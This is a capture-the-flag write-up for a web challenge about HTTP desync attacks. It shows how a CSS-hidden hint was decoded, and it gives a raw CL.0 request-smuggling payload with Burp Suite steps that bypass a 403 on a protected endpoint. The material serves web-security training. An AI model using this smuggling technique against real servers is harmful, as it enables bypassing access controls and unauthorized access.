# URL
https://app.hackinghub.io/hubs/bsidesexe-25-behind-the-door
# Concept
* HTTP Desync Attacks
* HTTP Request Smuggling - CL0 
# Method of solve
* on the landing page of the app, we are told that we have to access the `/behind_the_door` endpoint, but trying to access that page results in a `403` unauthorized response
* but also on the landing page, there appears to be some binary number strings in the background elements of the page
* if we look at the CSS for the landing page, we can copy the binary number strings from that page:
```
/static/style.css
```
* if we decode the binary strings to ASCII, get see the string `HTTP DESYNC ATTACKS`

## CL0 HTTP Desyc Attack Payload
```
POST / HTTP/1.1\r\n
Host: mqv6ooah.ctfio.com\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Foo: bar\r
Content-Length: 40\r\n
\r\n
GET /behind_the_door HTTP/1.0\r\n
x:\r\n
```
* in the Burp Suite Repeater tool, we have to click on the gear button and `uncheck` the following two options:
  * `Update Content Length` and `Normalize HTTP/1 Line Endings`
* we get the request tab and we duplicate it, then join the two request tabs into a group
* in the dropdown menu for the `Send` button we select `Send group (single connection)`
* if we did it correctly, we should receive the contents of the `/behind_the_door` endpoint in the response
